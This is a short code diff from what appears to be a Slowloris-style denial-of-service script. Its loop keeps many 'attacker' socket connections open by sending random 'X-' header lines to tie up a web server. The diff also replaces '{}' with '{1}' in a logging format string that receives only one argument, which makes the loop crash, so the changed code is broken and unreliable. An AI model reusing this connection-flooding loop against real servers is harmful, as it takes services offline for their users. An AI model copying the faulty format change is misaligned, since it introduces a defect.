@@ -100,10 +100,9 @@ def main():
 
     while True:
         try:
-            logging.info("Keeping {} attacker connections alive.. ".format(len(attackers)))
+            logging.info("Keeping {1} attacker connections alive.. ".format(len(attackers)))
             for s in list(attackers):
                 try:
-                    print("")
                     s.socket.send("X-{}: {}\r\n".format(randint(0, 50000), randint(0, 50000)).encode())
                 except socket.error as error:
                     logging.debug("Dead attacker: {} | Exception: {}".format(s.id, error))
